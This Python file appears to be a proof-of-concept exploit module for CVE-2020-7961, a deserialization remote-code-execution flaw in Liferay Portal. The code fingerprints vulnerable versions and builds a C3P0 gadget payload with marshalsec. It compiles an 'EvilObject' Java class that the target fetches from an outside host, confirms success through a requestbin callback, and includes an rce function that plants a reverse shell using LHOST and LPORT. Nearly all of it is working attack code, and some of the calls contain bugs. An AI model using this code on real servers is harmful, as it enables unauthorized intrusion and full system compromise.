

import requests
import re
import random
import uuid
from Framework.Library.Function.Function.PocSuite.api import paths
import os
import json
from Framework.Valueconfig import FORMATTIME, ValueStatus


class liferay_rce: 
    def __init__(self,url): 
        self.url = url

    def check_version(self): 
        resp = requests.get(self.url, verify=False)
        fixed_version = "7.2.1" 
        try: 
            match = re.findall(
                r'[0-9]+\.[0-9]+\.[0-9]',
                resp.headers['Liferay-Portal']
            )
            if(match[0]) < fixed_version: 
                return match[0] 
            else: 
                return False
        except: return False



    def exploit(self, objectData): 
        data = {
            'cmd': '''{"/expandocolumn/update-column":{}}''', 
            'p_auth': "YbnafeBK", 
            'formDate': 1614646547626, 
            'columnId': random.randint(1,100), 
            'name': random.randint(1,100), 
            'type': random.randint(1,100), 
            'defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource': objectData
            }
        
        r = requests.post( self.url+ "/api/jsonws/invoke", data = data, verify=False)
        print(requests.request.header)
        print(requests.request.body)
        
        

def verify(url): 
    result = liferay_rce(url)
    version = result.check_version()
    if version: 
        r  = requests.get(url + "/api/jsonws", verify=False)
        if r.status_code == 200: 
            return version
        else: 
            return False




def compile_data(filename, url_host_check, filename_of_payload): 
    os.system("javac " + filename)
    filename = filename.replace(".java", ".class")
    files = {
        "file_upload": open(filename, "rb")
    }
    resp = requests.post(url_host_check + "/upload", files=files, verify=False)
    path_tool = os.path.join(paths.POCSUITE_ROOT_PATH, 'Tool_Poc/marshalsec-0.0.3-SNAPSHOT-all.jar')
    data = os.popen("java -cp "+ path_tool+" marshalsec.Jackson C3P0WrapperConnPool " + url_host_check + "/cve/download/ " + filename_of_payload).read()
    result = data.strip('\n')
    result = result.split(",")[1].replace("]",'')
    print(result) 
    return result




def exploit(url, url_host_check): 
    result = liferay_rce(url)
    flag = uuid.uuid4().hex
    uniq_url = url_host_check + "/requestbin?data=" + flag
    filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_7961/EvilObject_source.java')
    with open(filename_source, "rb") as file:
        shell  = file.read().decode()
        file.close()
    shell = shell.replace("UNIQUE_URL", uniq_url)
    filename = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_7961/EvilObject1.java')
    with open(filename, 'wb') as file: 
        file.write(str.encode(shell))
        file.close() 
    ObjectData = compile_data(filename,url_host_check, "EvilObject1")
    result.exploit(ObjectData); 
    Check_success = requests.get(url_host_check + "/logrequestbin?data="+flag)
    if Check_success.status_code == 200:
        data = json.loads(Check_success.text)
        if data['status'] == ValueStatus.Success:
            return uniq_url
        else: 
            return False

def rce(url,url_host_check, lhost, lport): 
    filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_7961/EvilObject_shell_source.java')
    filename = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_7961/EvilObject.java')
    with open(filename_source, "rb") as file:
        shell  = file.read().decode()
        file.close()
    shell = shell.replace('LHOST_cve_2020_7961', lhost)
    shell = shell.replace('LPORT_cve_2020_7961', lport)
    with open(filename, "wb") as file:
        file.write( str.encode(shell))
        file.close()
    ObjectData = compile_data(filename,url_host_check, "EvilObject")
    result = liferay_rce(url)
    liferay_rce.exploit(ObjectData)
    



